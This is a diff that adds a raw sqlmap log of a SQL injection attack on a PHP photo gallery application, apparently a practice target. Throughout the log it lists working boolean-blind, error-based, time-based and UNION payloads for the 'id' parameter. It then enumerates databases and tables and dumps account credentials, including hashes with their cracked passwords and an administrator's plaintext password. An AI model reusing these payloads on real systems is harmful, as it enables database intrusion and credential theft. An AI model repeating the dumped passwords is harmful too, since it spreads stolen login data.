@@ -1,0 +1,146 @@
+sqlmap identified the following injection point(s) with a total of 155 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-1947 OR 9514=9514&sort=photoid
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(4700,3258)>(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(4700=4700,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM (SELECT 3455 UNION SELECT 9929 UNION SELECT 5320 UNION SELECT 1149)a GROUP BY x)&sort=photoid
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7553 FROM (SELECT(SLEEP(5)))ikKm)&sort=photoid
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x7176766271,0x6756687370774d436854656a49494c6868636e4759494a596b786744635949596146784d6c4f6374,0x717a627171),NULL,NULL,NULL,NULL,NULL-- -&sort=photoid
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP, Apache 2.2.8, PHP 5.2.4
+back-end DBMS: MySQL >= 4.1
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-1947 OR 9514=9514&sort=photoid
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(4700,3258)>(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(4700=4700,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM (SELECT 3455 UNION SELECT 9929 UNION SELECT 5320 UNION SELECT 1149)a GROUP BY x)&sort=photoid
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7553 FROM (SELECT(SLEEP(5)))ikKm)&sort=photoid
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x7176766271,0x6756687370774d436854656a49494c6868636e4759494a596b786744635949596146784d6c4f6374,0x717a627171),NULL,NULL,NULL,NULL,NULL-- -&sort=photoid
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8, PHP
+back-end DBMS: MySQL >= 4.1
+available databases [3]:
+[*] gallery
+[*] information_schema
+[*] mysql
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-1947 OR 9514=9514&sort=photoid
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(4700,3258)>(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(4700=4700,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM (SELECT 3455 UNION SELECT 9929 UNION SELECT 5320 UNION SELECT 1149)a GROUP BY x)&sort=photoid
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7553 FROM (SELECT(SLEEP(5)))ikKm)&sort=photoid
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x7176766271,0x6756687370774d436854656a49494c6868636e4759494a596b786744635949596146784d6c4f6374,0x717a627171),NULL,NULL,NULL,NULL,NULL-- -&sort=photoid
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP 5.2.4, PHP
+back-end DBMS: MySQL >= 4.1
+Database: gallery
+[7 tables]
++----------------------+
+| dev_accounts         |
+| gallarific_comments  |
+| gallarific_galleries |
+| gallarific_photos    |
+| gallarific_settings  |
+| gallarific_stats     |
+| gallarific_users     |
++----------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-1947 OR 9514=9514&sort=photoid
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(4700,3258)>(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(4700=4700,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM (SELECT 3455 UNION SELECT 9929 UNION SELECT 5320 UNION SELECT 1149)a GROUP BY x)&sort=photoid
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7553 FROM (SELECT(SLEEP(5)))ikKm)&sort=photoid
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x7176766271,0x6756687370774d436854656a49494c6868636e4759494a596b786744635949596146784d6c4f6374,0x717a627171),NULL,NULL,NULL,NULL,NULL-- -&sort=photoid
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: Apache 2.2.8, PHP, PHP 5.2.4
+back-end DBMS: MySQL >= 4.1
+Database: gallery
+Table: dev_accounts
+[2 entries]
++----+------------+---------------------------------------------+
+| id | username   | password                                    |
++----+------------+---------------------------------------------+
+| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
+| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
++----+------------+---------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-1947 OR 9514=9514&sort=photoid
+
+    Type: error-based
+    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=1 OR ROW(4700,3258)>(SELECT COUNT(*),CONCAT(0x7176766271,(SELECT (ELT(4700=4700,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM (SELECT 3455 UNION SELECT 9929 UNION SELECT 5320 UNION SELECT 1149)a GROUP BY x)&sort=photoid
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1 AND (SELECT 7553 FROM (SELECT(SLEEP(5)))ikKm)&sort=photoid
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x7176766271,0x6756687370774d436854656a49494c6868636e4759494a596b786744635949596146784d6c4f6374,0x717a627171),NULL,NULL,NULL,NULL,NULL-- -&sort=photoid
+---
+web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
+web application technology: PHP 5.2.4, Apache 2.2.8, PHP
+back-end DBMS: MySQL >= 4.1
+Database: gallery
+Table: gallarific_users
+[1 entry]
++--------+---------+---------+---------+----------+----------+----------+-----------+-----------+------------+------------+-------------+
+| userid | email   | photo   | website | joincode | lastname | username | usertype  | firstname | password   | datejoined | issuperuser |
++--------+---------+---------+---------+----------+----------+----------+-----------+-----------+------------+------------+-------------+
+| 1      | <blank> | <blank> | <blank> | <blank>  | User     | admin    | superuser | Super     | n0t7t1k4   | 1302628616 | 1           |
++--------+---------+---------+---------+----------+----------+----------+-----------+-----------+------------+------------+-------------+
+
